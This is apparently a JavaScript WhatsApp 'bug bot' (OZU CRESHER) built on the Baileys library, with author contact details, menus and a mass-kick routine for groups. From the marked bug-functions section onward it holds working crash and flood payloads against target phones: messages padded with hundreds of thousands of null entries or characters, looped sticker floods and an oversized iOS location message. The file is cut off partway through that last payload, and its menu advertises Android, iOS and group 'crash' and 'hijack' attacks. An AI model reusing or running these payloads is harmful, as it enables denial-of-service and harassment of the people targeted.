/* 
══════════════════════════════════════════
      OZU CRESHER BUG BOT CODE BY BADBOI 
          OWNER: BAD_BOI STILLCHASING 
       TELEGRAM: @badboistillchasing
       CONTACT: +2349017593981
       
     ⚠️ RESPECT THE DEVELOPER – DO NOT REMOVE CREDIT
══════════════════════════════════════════
*/
console.log("ᴏᴢᴜ ᴄʀᴀsʜᴇʀ ɪs ᴀᴄᴛɪᴠᴇ💯🔥");
require('./config');
//install the Libraries 
const { default: baileys, proto, generateWAMessage, generateWAMessageFromContent, getContentType, useMultiFileAuthState, prepareWAMessageMedia, InteractiveMessage, relayWAMessage,  downloadContentFromMessage } = require("@whiskeysockets/baileys");
const getDevice = require("@whiskeysockets/baileys").getDevice
const { jidNormalizedUser } = require('@whiskeysockets/baileys')
// install the Modules
const pino = require('pino')
const fs = require('fs')
const axios = require('axios')
const yts = require('yt-search')
const fetch = require('node-fetch')
const path = require("path")
const chalk = require('chalk')
const speed = require('performance-now')
const moment = require('moment-timezone')
const crypto = require("crypto");
const os = require('os')
const util = require('util')
const { spawn: spawn, exec } = require("child_process")
const ffmpeg = require('fluent-ffmpeg');

/** ======{  Latest Bug Bot 2026 (✅ ozu cresher V1.0) }==========
**/

/* Call the Module name */
module.exports = async (stillchasing, m) => {
try {
const body = (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) ? (
(m.mtype === 'conversation' && m.message.conversation) ||
(m.mtype === 'imageMessage' && m.message.imageMessage.caption) ||
(m.mtype === 'documentMessage' && m.message.documentMessage.caption) ||
(m.mtype === 'videoMessage' && m.message.videoMessage.caption) ||
(m.mtype === 'extendedTextMessage' && m.message.extendedTextMessage.text) ||
(m.mtype === 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ||
(m.mtype === 'templateButtonReplyMessage' && m.message.templateButtonReplyMessage.selectedId)
) : '';

const budy = (typeof m.text === 'string' ? m.text : '');

global.prefa = [".", "!", ",", "", "🐤", "🗿"]; // Do Not Change!!
const prefix = global.prefa
    ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body)
        ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0]
        : ""
    : global.prefa ?? global.prefix;
// Owner & Premium data

const owner = JSON.parse(fs.readFileSync('./database/owner.json'));
const Premium = JSON.parse(fs.readFileSync('./database/premium.json'));
const sender = m.isGroup
    ? (m.key.participant || m.participant || '')
    : m.key.remoteJid;
const botNumber = jidNormalizedUser(stillchasing.user.id)
// ================== BASIC INFO ==================
const kickAllConfirm = new Map()
const isCreator = [botNumber, ...owner]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
const isPremium = [botNumber, ...Premium]
    .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
    .includes(sender);
// Command detection
const isCmd = (body || "").startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1);
const text = q = args.join(" ");
const quoted = m.quoted ? m.quoted : m;
const from = m.key.remoteJid;
const isGroup = from.endsWith("@g.us");
// ✅ Fetch metadata safely
const groupMetadata = isGroup ? await stillchasing.groupMetadata(from).catch(() => ({})) : {};
const groupName = groupMetadata.subject || '';
const groupMembers = isGroup ? groupMetadata.participants || [] : [];

// --- DEFINE PARTICIPANTS ---
const participants = isGroup ? (groupMetadata.participants || []) : [];
const getGroupAdmins = (participants) => {
    const admins = [];
    for (const participant of participants) {
        if (participant.admin === 'admin' || participant.admin === 'superadmin') {
            admins.push(participant.id || participant.jid); // ensure correct property
        }
    }
    return admins;
};
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : [];
// ✅ Bot number with safe fallback
// ✅ Checks
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
const isAdmins = isGroup ? groupAdmins.includes(sender) || isCreator : false;
// ✅ Useful extras
const groupDesc = groupMetadata.desc ? groupMetadata.desc : '';
const groupOwner = groupMetadata.owner || (groupAdmins.length ? groupAdmins[0] : "");
const groupMembersId = groupMembers.map(member => member.id);
const pushname = m.pushName || "No Name"
const senderNumber = sender.split('@')[0];
const time = moment(Date.now()).tz('Africa/Lagos').locale('en').format('HH:mm:ss z');
const mime = (quoted.msg || quoted).mimetype || ''
const dateNG = new Date().toLocaleDateString('en-NG', {
  timeZone: 'Africa/Lagos',
  year: 'numeric',
  month: 'long',
  day: 'numeric'
});
const timeNG = new Date().toLocaleTimeString('en-NG', {
  timeZone: 'Africa/Lagos',
  hour: '2-digit',
  minute: '2-digit',
  second: '2-digit',
  hour12: false
});
const fullDateTime = `Date: ${dateNG} | Time: ${timeNG}`;

if (!stillchasing.public && !isCreator) return;


stillchasing.ev.on("messages.upsert", async ({ messages }) => {
  const msg = messages[0]
  if (!msg.message) return

  const btn =
    msg.message.buttonsResponseMessage?.selectedButtonId
  if (!btn) return

  const chatId = msg.key.remoteJid
  const sender = msg.key.participant || msg.key.remoteJid

  const confirm = kickAllConfirm.get(chatId)
  if (!confirm) return

  // Fetch group metadata
  const metadata = await stillchasing.groupMetadata(chatId)
  const admins = metadata.participants
    .filter(p => p.admin)
    .map(p => p.id)

  
  // 🚫 Only Admin or Creator can confirm
  if (!isAdmins && !isCreator) {
    return stillchasing.sendMessage(chatId, {
      text: "🚫 *Only Group Admins or Bot Owner can confirm this action.*"
    })
  }

  // ❌ CANCEL
  if (btn === "kickall_no") {
    kickAllConfirm.delete(chatId)
    return stillchasing.sendMessage(chatId, {
      text: "❌ *KickAll cancelled successfully.*"
    })
  }

  // ✅ CONFIRM
  if (btn === "kickall_yes") {
    kickAllConfirm.delete(chatId)

    const members = metadata.participants

    const botId = stillchasing.user.id.split(":")[0] + "@s.whatsapp.net"
    const owner = metadata.owner

    const targets = members
      .map(p => p.id)
      .filter(id =>
        id !== botId &&
        id !== owner &&
        id !== sender
      )

    await stillchasing.sendMessage(chatId, {
      text: "🔥 *KickAll in progress... Removing all members*"
    })

    await stillchasing.groupParticipantsUpdate(chatId, targets, "remove")

    await stillchasing.sendMessage(chatId, {
      text: `
╔════════════════════════════╗
║ 💥 𝗞𝗜𝗖𝗞 𝗔𝗟𝗟 𝗦𝗨𝗖𝗖𝗘𝗦𝗦
╠════════════════════════════╣
║ 👥 Members Removed : ${targets.length}
║ 👑 Remaining Users:
║ • Bot
║ • Group Owner
║ • Admin who confirmed
╚════════════════════════════╝
      `.trim()
    })
  }
})

/*if (getSetting(m.chat, "antilink", false) && m.isGroup) {
    let linkRegex = /(https?:\/\/[^\s]+)/gi;

    if (linkRegex.test(m.text)) {
        if (isAdmins || isCreator) return;   // skip if sender is admin/owner

        // 1. Warn the user
        await stillchasing.sendMessage(m.chat, { 
            text: `⛔ *Link Detected!* \n@${m.sender.split("@")[0]} not allowed to share links.`, 
            mentions: [m.sender] 
        }, { quoted: m });

        // 2. Delete the link message
        try {
            await stillchasing.sendMessage(m.chat, { 
                delete: m.key 
            });
        } catch (e) {
            console.log("Failed to delete message:", e);
        }

        // 3. 🔥 Kick the user 
        try {
            await stillchasing.groupParticipantsUpdate(
                m.chat,                    // group JID
                [m.sender],                // array of users to kick
                "remove"                   // action: "remove", "add", "promote", "demote"
            );

            await stillchasing.sendMessage(m.chat, { 
                text: `✅ @${m.sender.split("@")[0]} has been removed for sharing a link.`, 
                mentions: [m.sender] 
            });
        } catch (e) {
            console.log("❌ Failed to kick user:", e);
            // Optional: send a message if kick fails (e.g. bot is not admin)
            await stillchasing.sendMessage(m.chat, { text: "❌ Failed to remove user. Make sure I'm an admin." });
        }
    }
}*/


//function 
const { 
smsg, 
sendGmail, 
formatSize, 
isUrl, 
generateMessageTag, 
getBuffer, 
getSizeMedia, 
runtime, 
fetchJson, 
formatp,
getTime,
getRandom } = require('./lib/myfunction');
if (m.message) {
    console.log(chalk.blue('╭─────────────────────────────'));
    console.log(chalk.green('│ 📩 𝐍𝐞𝐰 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐃𝐞𝐭𝐞𝐜𝐭𝐞𝐝 :'));
    console.log(chalk.blue('├─────────────────────────────'));
    console.log(chalk.yellow(`│ 📅 𝐓𝐨𝐝𝐚𝐲 𝐃𝐚𝐭𝐞 : `) + chalk.cyan(new Date().toLocaleString()));
    console.log(chalk.yellow(`│ 💬 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 : `) + chalk.white(m.body || m.mtype));
    console.log(chalk.yellow(`│ 👤 𝐒𝐞𝐧𝐝𝐞𝐫 : `) + chalk.magenta(pushname));
    console.log(chalk.yellow(`│ 🔢 𝐍𝐮𝐦𝐛𝐞𝐫 :: `) + chalk.red(senderNumber));
    if (m.isGroup) {
    console.log(chalk.blue('├─────────────────────────────'));
        console.log(chalk.green(`│ 🏠 𝐆𝐫𝐨𝐮𝐩 : `) + chalk.green(groupName));
        console.log(chalk.red(`│ 🆔 𝐆𝐫𝐨𝐮𝐩 𝐈𝐃 : `) + chalk.red(m.chat));
    }
    console.log(chalk.blue('╰─────────────────────────────\n'));
}
function parseTime(input) {
    let time = parseInt(input);
    if (input.endsWith("s")) return time * 1000;          // seconds
    if (input.endsWith("m")) return time * 60000;         // minutes
    if (input.endsWith("h")) return time * 3600000;       // hours
    if (input.endsWith("d")) return time * 86400000;      // days
    return null;
}


const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2026",
      thumbnailUrl: 'https://files.catbox.moe/fddn3l.png',
      itemCount: "2026-2028",
      status: "INQUIRY",
      surface: "CATALOG",
      message: `© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ʙᴀᴅ_ʙᴏɪ_sᴛɪʟʟᴄʜᴀsɪɴɢ 🔥`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363405765816590@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
    // =======================================================
    // REPLY FUNCTION
    const Reply = (txt) => {
  stillchasing.sendMessage(
    from,
    {
      text: txt,
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363405765816590@newsletter",
          serverMessageId: null,
          newsletterName: "𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 !!"
        },
        externalAdReply: {
          showAdAttribution: true,
          title: "𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍",
          body: "𝗩𝗲𝗿𝘀𝗶𝗼𝗻 2.0",
          thumbnailUrl: "https://files.catbox.moe/fddn3l.png", // ✅ fixed
          previewType: 1 // ✅ fixed
        }
      }
    },
    { quoted: lol }
  );
};
    const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
    // =======================================================
switch(command) {   
    
case "menu": 
case "ozu":{

let menu = `
╔════════════════════════════════════╗
║        ⚡ 𝑶𝒁𝑼 𝑪𝑹𝑨𝑺𝑯𝑬𝑹 v2.5 ⚡        ║
╚════════════════════════════════════╝

╭━━━═━═━═━═━═━═━═━═━═━╮
┃ 🤌 𝗛𝗲𝗹𝗹𝗼 *${pushname}* 𝘄𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼
┃
┃ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗯𝘆 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 👩‍💻
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        ⚙️ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗡𝗮𝗺𝗲       : 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
┃ ⦿ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻    : 2.0
┃ ⦿ 𝗠𝗼𝗱𝗲       : ${stillchasing.public ? "𝗣𝗨𝗕𝗟𝗜𝗖 🌐" : "𝗦𝗘𝗟𝗙 🔒"}
┃ ⦿ 𝗘𝗻𝗴𝗶𝗻𝗲     : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 ⚡
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        📅 𝗦𝗬𝗦𝗧𝗘𝗠
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗗𝗮𝘁𝗲       : ${dateNG}
┃ ⦿ 𝗧𝗶𝗺𝗲       : ${timeNG}
┃ ⦿ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲    : ${runtime(process.uptime())}
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        👨‍💻 𝗖𝗥𝗘𝗔𝗧𝗢𝗥
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿       : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
┃
╰━━━═━═━═━═━═━═━═━═━═━╯

`;

const media = await prepareWAMessageMedia(
  {
    image: fs.readFileSync('./lib/image/ozu.jpeg')
  },
  { upload: stillchasing.waUploadToServer }
);

let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({
          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363405765816590@newsletter",
              serverMessageId: 1,
              newsletterName: "𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.5 "
            }
          },
          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
          }),
          body: proto.Message.InteractiveMessage.Body.create({
            text: menu
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴"
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🐞 ʙᴜɢ ᴍᴇɴᴜ",
                  id: `${prefix}bugmenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "👑 ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
                  id: `${prefix}ownermenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "👥 ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
                  id: `${prefix}groupmenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🌹 ᴅᴇᴠᴇʟᴏᴘᴇʀ",
                  id: `${prefix}dev`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🆘 ʜᴇʟᴘ",
                  id: `${prefix}help`
                })
              }
            ]
          })
        })
      }
    }
  },
  { quoted: lol }
);

await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

await stillchasing.sendMessage(
  m.chat,
  {
    audio: fs.readFileSync('./lib/new.mp3'),
    mimetype: 'audio/mpeg',
    ptt: false
  },
  { quoted: lol }
);
}
break;

case "bugmenu": {
let menu = `
╭════════════════════╮
        𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
╰════════════════════╯

╭━━━═━═━═━═━═━═━═━═━═━╮
┃ 🤌 𝗛𝗲𝗹𝗹𝗼 *${pushname}*
┃
┃ 𝗧𝗵𝗶𝘀 𝗶𝘀 𝗮 𝗽𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗕𝘂𝗴 𝗕𝗼𝘁
┃ 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗱 𝗯𝘆 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴 👩‍💻
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        ⚙️ 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗡𝗮𝗺𝗲       : 𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥
┃ ⦿ 𝗩𝗲𝗿𝘀𝗶𝗼𝗻    : 2.0
┃ ⦿ 𝗠𝗼𝗱𝗲       : ${stillchasing.public ? "𝗣𝗨𝗕𝗟𝗜𝗖 🌐" : "𝗦𝗘𝗟𝗙 🔒"}
┃ ⦿ 𝗘𝗻𝗴𝗶𝗻𝗲     : 𝗕𝗮𝗶𝗹𝗲𝘆𝘀 ⚡
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        📅 𝗦𝗬𝗦𝗧𝗘𝗠
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗗𝗮𝘁𝗲       : ${dateNG}
┃ ⦿ 𝗧𝗶𝗺𝗲       : ${timeNG}
┃ ⦿ 𝗥𝘂𝗻𝘁𝗶𝗺𝗲    : ${runtime(process.uptime())}
┃
┣━━━═━═━═━═━═━═━═━═━═━┫
┃        👨‍💻 𝗖𝗥𝗘𝗔𝗧𝗢𝗥
┣━━━═━═━═━═━═━═━═━═━═━┫
┃ ⦿ 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿       : 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴
┃
╰━━━═━═━═━═━═━═━═━═━═━╯

╔══════════════════════════════════════╗
║   ☠️ ⚡ 𝙊𝙕𝙐 𝘾𝙍𝘼𝙎𝙃𝙀𝙍 𝗕𝗨𝗚 𝙈𝙀𝙉𝙐 ⚡ ☠️   ║
╠══════════════════════════════════════╣
║        『 𝗣𝗢𝗪𝗘𝗥 𝗢𝗙 𝗗𝗘𝗦𝗧𝗥𝗨𝗖𝗧𝗜𝗢𝗡 』       ║
╚══════════════════════════════════════╝


╔═══〔 🐞 𝑨𝑵𝑫𝑹𝑶𝑰𝑫 𝑩𝑼𝑮𝑺 〕═══╗
║
║  ⬣ 𝑫𝒆𝒍𝒂𝒚-𝑯𝒂𝒓𝒅
║  ⬣ 𝑪𝒓𝒂𝒔𝒉
║  ⬣ 𝑫𝒆𝒍𝒂𝒚
║  ⬣ 𝑭𝒐𝒓𝒄𝒆-𝑪𝒍𝒐𝒔𝒆
║  ⬣ 𝑰𝒏𝒗𝒊𝒔𝒊𝒃𝒍𝒆
║  ⬣ 𝑻𝒓𝒂𝒔𝒉
║  ⬣ 𝒐𝒛𝒖-𝒑𝒂𝒊𝒓
║  ⬣ 𝒐𝒛𝒖-𝑫𝒆𝒍𝒂𝒚 
║
╚════════════════════════════╝


╔═══〔 ✨ 𝑰𝑶𝑺 𝑩𝑼𝑮𝑺 〕═══╗
║
║  ⬣ 𝑫𝒆𝒍𝒂𝒚-𝒊𝒐𝒔
║  ⬣ 𝑻𝒓𝒂𝒔𝒉-𝒊𝒐𝒔
║  ⬣ 𝑲𝒊𝒍𝒍-𝒊𝒐𝒔
║  ⬣ 𝑭𝒄-𝒊𝒐𝒔
║  ⬣ 𝑰𝒏𝒗𝒊𝒔𝒊𝒃𝒍𝒆-𝒊𝒐𝒔
║
╚════════════════════════════╝


╔═══〔 🔥 𝑺𝑨𝑴𝑺𝑼𝑵𝑮 𝑩𝑼𝑮𝑺 〕═══╗
║
║  ⬣ 𝑫𝒓𝒊𝒍𝒍𝒆𝒓
║  ⬣ 𝑲𝒊𝒍𝒍𝒆𝒓
║  ⬣ 𝑫𝒆𝒍𝒂𝒚𝒊𝒏𝒈
║  ⬣ 𝑪𝒓𝒂𝒔𝒉𝒊𝒏𝒈
║  ⬣ 𝑭𝒐𝒓𝒄𝒆-𝑼𝑰
║
╚════════════════════════════╝


╔═══〔 💣 𝑮𝑹𝑶𝑼𝑷 𝑩𝑼𝑮𝑺 〕═══╗
║
║  ⬣ 𝒌𝒊𝒍𝒍-𝒈𝒄
║  ⬣ 𝒅𝒆𝒍𝒂𝒚-𝒈𝒄
║  ⬣ 𝒉𝒊𝒋𝒂𝒄𝒌
║
╚════════════════════════════╝
`;

const media = await prepareWAMessageMedia(
  {
    image: fs.readFileSync('./lib/image/ozu10.jpeg')
  },
  { upload: stillchasing.waUploadToServer }
);

let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: proto.Message.InteractiveMessage.create({

          contextInfo: {
            forwardingScore: 99999,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363405765816590@newsletter",
              serverMessageId: 1,
              newsletterName: "𝗢𝗭𝗨 𝗖𝗥𝗔𝗦𝗛𝗘𝗥 𝗩2.0 "
            }
          },

          header: proto.Message.InteractiveMessage.Header.create({
            title: "",
            hasMediaAttachment: true,
            imageMessage: media.imageMessage
          }),

          body: proto.Message.InteractiveMessage.Body.create({
            text: menu
          }),

          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "© 𝗯𝗮𝗱𝗯𝗼𝗼𝘀𝘁𝗶𝗹𝗹𝗰𝗵𝗮𝘀𝗶𝗻𝗴"
          }),

          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🌹 ᴅᴇᴠ",
                  id: `${prefix}dev`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "👑 ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
                  id: `${prefix}ownermenu`
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "🔙 ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ",
                  id: `${prefix}menu`
                })
              }
            ]
          })
        })
      }
    }
  },
  { quoted: lol }
);

await stillchasing.relayMessage(m.chat, msg.message, { messageId: msg.key.id });

await stillchasing.sendMessage(
  m.chat,
  {
    audio: fs.readFileSync('./lib/crypto.mp3'),
    mimetype: 'audio/mpeg',
    ptt: false
  },
  { quoted: lol }
);

}
break;
//====BUG FUNCTIONS START HERE ====//}========//
async function stx(target, ait = true) {
  const x = {
    message: {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724",
        stickerSentTs: "1775044724091",
      }
    }
  }
  
  stillchasing.relayMessage(target, {
    extendedTextMessage: {
      text: "Hi",
      contextInfo: {
        participant: "13135550202@s.whatsapp.net",
        quotedMessage: x.message,
        remoteJid: "status@broadcast",
        urlTrackingMap: {
          urlTrackingMapElements: Array.from({ length: 500000 }, () => ({
            "\0": "\0"
          }))
        }
      }
    }
  }, ait ? {
    participant: { jid: target }
  } : {})
}
//===== bug functions ====//
async function DelayVisi(stillchasing, target) {
  const RumahRoblokKa = generateWAMessageFromContent(
    target,
    {
      groupStatusMessageV2: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "VSX",
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"999999","building_name":"visi","landmark_area":"X","address":"RumahRoblokKa","tower_number":"RumahRoblokKa","city":"arab","name":"RumahRoblokKa","phone_number":"999999999999","house_number":"xxx","floor_number":"smkui","state":"RumahRoblokKa | ${"\u0000".repeat(900000)}"}}`,
              version: 3
            }
          }
        }
      }
    },
    {
      userJid: target,
      quoted: null
    }
  );

  await stillchasing.relayMessage(target, RumahRoblokKa.message, {
    participant: { jid: target },
    messageId: RumahRoblokKa.key.id
  });
}
//===sticker crash ====
async function stickerCrash(target) {
for (let r = 0; r < 1000; r++) {
await stillchasing.relayMessage(target, {
groupStatusMessageV2: {
message: {
stickerMessage: {
url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
mimetype: "image/webp",
directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
fileLength: "10610",
mediaKeyTimestamp: "1775044724",
stickerSentTs: "1775044724091"
}
}
}
}, { participant: { jid: target }, messageId: stillchasing.generateMessageTag() });
await sleep(1500);
}
}
// BUG FUNCTIONS
async function StcSqL(stillchasing, target) {
 for (let i = 0; i < 100; i++) {
const cr = {
 key: {
  remoteJid: "status@broadcast",
   participant: "13135550002@bot",
     fromMe: false
 },
 message: {
     conversation: ""
  }
 };
const msg = generateWAMessageFromContent(target, {
   stickerMessage: {
     url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
   fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
   fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
   mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
   mimetype: "image/webp",
   directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
   fileLength: "10610",
  mediaKeyTimestamp: "1775044724",
  stickerSentTs: "1775044724091",
 }
 }, {
 quoted: cr
 });
await stillchasing.relayMessage(target, {
   groupStatusMessageV2: {
     message: msg.message
   }
 }, {
     participant: { jid: target },
       messageId: msg.key.id
 }); 
 await sleep(7000);
 }
}
//-----------( IOS BUGS )----------------//
async function TrashLocIosX(target, ptcp = true) {
  let msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -9.09999262999,
          degreesLongitude: 199.9996311899,
          name: "🧪⃟꙰ 𝐱𝐂𝐮𝐫𝐬𝐞𝐝𝐍𝐅 ✶" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), 
